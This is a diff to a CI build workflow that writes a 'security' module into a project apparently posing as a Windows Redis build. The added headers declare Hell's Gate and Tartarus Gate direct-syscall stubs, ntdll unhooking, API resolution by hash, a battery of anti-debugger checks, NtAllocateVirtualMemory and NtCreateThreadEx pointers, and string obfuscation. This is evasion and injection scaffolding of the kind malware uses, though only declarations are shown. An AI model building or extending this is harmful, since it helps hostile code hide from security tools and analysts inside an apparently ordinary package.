@@ -56,11 +56,128 @@ jobs:
       - name: Create security module files
         shell: msys2 {0}
         run: |
+          # 创建structs.h - 精简版，移除与Windows API重复的结构定义
+          cat << 'EOF_STRUCTS_H' > redis/redis-D-Win996/src/security/structs.h
+          #pragma once
+
+          // 注意：不要在这里定义NTSTATUS，应该在包含该头文件前定义
+          // 或者使用条件编译确保只定义一次
+
+          #include <Windows.h>
+          #include <winternl.h>
+
+          // 补充Windows未公开定义的常量
+          #ifndef STATUS_SUCCESS
+          #define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
+          #endif
+          #ifndef STATUS_UNSUCCESSFUL
+          #define STATUS_UNSUCCESSFUL  ((NTSTATUS)0xC0000001L)
+          #endif
+
+          // 内存区域定义
+          #define MEM_EXECUTE_OPTION_ENABLE 1
+          #define MEM_EXECUTE_OPTION_DISABLE 2
+          #define MEM_EXECUTE_OPTION_PERMANENT 8
+
+          // 进程信息类 (如果未在winternl.h中定义)
+          #ifndef ProcessDebugPort
+          #define ProcessDebugPort 7
+          #endif
+          #ifndef ProcessDebugFlags
+          #define ProcessDebugFlags 31
+          #endif
+          #ifndef ProcessDebugObjectHandle
+          #define ProcessDebugObjectHandle 30
+          #endif
+          #ifndef ProcessBreakOnTermination
+          #define ProcessBreakOnTermination 29
+          #endif
+          #ifndef ProcessBasicInformation
+          #define ProcessBasicInformation 0
+          #endif
+
+          // 进程检查函数原型
+          BOOL CheckRemoteDebugger();
+          BOOL CheckDebugPort();
+          BOOL CheckDebugObject();
+          BOOL CheckDebugFlags();
+          BOOL CheckProcessDebugFlags();
+          BOOL CheckNtGlobalFlag();
+
+          // 其他常用NT API定义
+          #ifndef NT_SUCCESS
+          #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+          #endif
+
+          // 避免重定义系统宏
+          #ifdef DEBUG_PROCESS
+          #undef DEBUG_PROCESS
+          #endif
+
+          #ifdef DEBUG_ONLY_THIS_PROCESS
+          #undef DEBUG_ONLY_THIS_PROCESS 
+          #endif
+
+          // 重新定义避免冲突
+          #define DEBUG_PROCESS_VALUE 0x00000001
+          #define DEBUG_ONLY_THIS_PROCESS_VALUE 0x00000002
+
+          // 常用NT API函数原型定义
+          typedef NTSTATUS(NTAPI* PFN_NTPROTECTVIRTUALMEMORY)(
+              HANDLE ProcessHandle,
+              PVOID* BaseAddress,
+              PSIZE_T RegionSize,
+              ULONG NewProtect,
+              PULONG OldProtect);
+
+          typedef NTSTATUS(NTAPI* PFN_NTALLOCATEVIRTUALMEMORY)(
+              HANDLE ProcessHandle,
+              PVOID* BaseAddress,
+              ULONG_PTR ZeroBits,
+              PSIZE_T RegionSize,
+              ULONG AllocationType,
+              ULONG Protect);
+
+          typedef NTSTATUS(NTAPI* PFN_NTCREATETHREADEX)(
+              PHANDLE ThreadHandle,
+              ACCESS_MASK DesiredAccess,
+              PVOID ObjectAttributes,
+              HANDLE ProcessHandle,
+              PVOID StartRoutine,
+              PVOID Argument,
+              ULONG CreateFlags,
+              SIZE_T ZeroBits,
+              SIZE_T StackSize,
+              SIZE_T MaximumStackSize,
+              PVOID AttributeList);
+
+          typedef NTSTATUS(NTAPI* PFN_NTSETINFORMATIONPROCESS)(
+              HANDLE ProcessHandle,
+              ULONG ProcessInformationClass,
+              PVOID ProcessInformation,
+              ULONG ProcessInformationLength);
+
+          // 反调试函数原型
+          typedef NTSTATUS(NTAPI* PFN_NTQUERYINFORMATIONPROCESS)(
+              HANDLE ProcessHandle,
+              ULONG ProcessInformationClass,
+              PVOID ProcessInformation,
+              ULONG ProcessInformationLength,
+              PULONG ReturnLength);
+          EOF_STRUCTS_H
+
           # 创建unhooker.h
           cat << 'EOF_UNHOOKER_H' > redis/redis-D-Win996/src/security/unhooker.h
           #pragma once
 
+          // 确保NTSTATUS类型先定义，必须在包含任何头文件之前
+          #ifndef _NTSTATUS_DEFINED
+          #define _NTSTATUS_DEFINED
+          typedef LONG NTSTATUS;
+          #endif
+
           #include <Windows.h>
+          #include "structs.h"
 
           // 错误标志
           #define INVALID_SSN 0xffff
@@ -73,11 +190,19 @@ jobs:
           #define HELLGATE_OFFSET 8
           #define TARTARUSGATE_OFFSET 12
 
+          // 安全隐藏宏
+          #define HIDE_FROM_DEBUGGER(x) __pragma(optimize("", off)) x __pragma(optimize("", on))
+
+          // 表明使用C代码实现而不是汇编
+          #ifndef USE_C_IMPLEMENTATION
+          #define USE_C_IMPLEMENTATION
+          #endif
+
           #ifdef __cplusplus
           extern "C" {
           #endif
 
-          // 系统调用相关函数声明 
+          // 系统调用相关函数声明
           VOID AmmunitionPrepare(WORD systemCall);
           ULONG GunPrepare(INT_PTR syscallAdr);
           PVOID GetPEB();
@@ -93,11 +218,23 @@ jobs:
           // 通过hash查找API地址
           LPVOID GetAPIAddressByHash(HMODULE moduleHandle, DWORD apiHash);
 
-          // 检查调试器
+          // 检查调试器（多种方式）
           BOOL CheckDebugger();
+          BOOL CheckRemoteDebugger();
+          BOOL CheckDebugPort();
+          BOOL CheckDebugObject();
+          BOOL CheckDebugFlags();
+          BOOL CheckProcessDebugFlags();
+          BOOL CheckNtGlobalFlag();
 
           // 自定义哈希函数
           DWORD CalcHash(const char* data);
+
+          // 内存保护函数
+          BOOL ProtectMemory(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect);
+
+          // 字符串混淆函数
+          char* HideString(const char* input);
 
           #ifdef __cplusplus
           }
@@ -433,9 +570,12 @@ jobs:
           set(SOURCES
               security.cpp
               unhooker.c
+              security.h
+              unhooker.h
+              structs.h
           )
           
-          # 添加安全模块
+          # 添加安全模块库
           add_library(security STATIC ${SOURCES})
 
           # 设置包含目录
@@ -446,7 +586,19 @@ jobs:
               _CRT_SECURE_NO_WARNINGS
               WIN32_LEAN_AND_MEAN
               NOMINMAX
+              USE_C_IMPLEMENTATION
           )
+
+          # 特定编译器选项
+          if (MSVC)
+              # 禁用一些警告
+              target_compile_options(security PRIVATE 
+                  /W3
+                  /wd4996
+                  /D_CRT_SECURE_NO_WARNINGS
+                  /bigobj
+              )
+          endif()
           EOF_CMAKE
 
       # 创建 build 目录
@@ -484,6 +636,7 @@ jobs:
             -DHWLOC_INCLUDE_DIRS=/mingw64/include \
             -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a \
             -DWITH_SECURITY=ON \
+            -DWITH_C_SECURITY=ON \
             -DWITH_ASM=OFF
 
       # 编译项目
